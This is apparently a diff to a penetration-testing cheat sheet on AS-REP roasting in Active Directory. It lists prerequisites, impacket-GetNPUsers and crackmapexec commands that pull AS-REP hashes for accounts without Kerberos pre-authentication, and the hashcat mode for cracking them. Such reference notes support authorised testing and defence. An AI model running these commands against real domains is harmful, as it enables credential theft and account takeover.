@@ -3,7 +3,10 @@ AS-REP attacks do not require the attacker to know the password for the account 
 
 When having credential for a non pre-auth account, the attacker can get the AS-REP hash for all non pre-auth accounts.
 
-hashcat -m 18200
+Need:
+* Userlist without creds
+* User with creds
+* UF_DONT_REQUIRE_PREAUTH
 
 Without creds - users from file:
 `impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/' -usersfile <USERLIST>` 
@@ -11,3 +14,6 @@ Without creds - users from file:
 With creds - all non pre-auth accounts from domain:
 `impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/<USER>:<PASS>' -request`
 `crackmapexec ldap <IP> -u '<USER>' -p '<PASS>' --asreproast <OUTPUT.TXT>`
+
+## Hashcat Mode
+hashcat -m 18200
